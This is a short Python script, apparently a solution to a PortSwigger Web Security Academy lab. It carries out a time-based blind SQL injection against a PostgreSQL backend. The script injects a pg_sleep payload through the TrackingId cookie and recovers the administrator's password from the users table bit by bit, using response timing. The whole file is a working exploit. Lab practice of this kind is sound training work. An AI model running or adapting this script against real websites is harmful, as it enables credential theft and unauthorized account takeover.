#!/usr/bin/python3
import requests,time,sys
# URL del laboratorio
url = 'https://LAB-ID.web-security-academy.net'
password = ""
cookie = ("XYZ'||(SELECT CASE WHEN SUBSTRING(ASCII(SUBSTRING(password,%d,1))::bit(8),%d,1)=0::bit(1) "
    "THEN pg_sleep(2) ELSE pg_sleep(0) END "
    "FROM users WHERE username='administrator')--")

print("[*] Iniciando SQLi")
# Posiciones de la contraseña del 1 al 20
for position in range(1,21):
    byte = ""
    # Posiciones de bit del 1 al 8
    for bit_position in range(1,9):
        cookies = { "TrackingId": cookie % (position, bit_position) }
        time_start=time.time()
        requests.get(url, cookies=cookies)
        time_end = time.time()
        # Tiempo de respuesta mayor a 2 segundos (inyección exitosa)
        if time_end - time_start > 2:
            byte += "0"
        else:
            byte += "1"
    # Conversión del entero en base 2
    extracted_chr = chr(int(byte, 2))
    password += extracted_chr
    sys.stdout.write(extracted_chr)
    sys.stdout.flush()

print("\n[+] Password: %s" % (password))
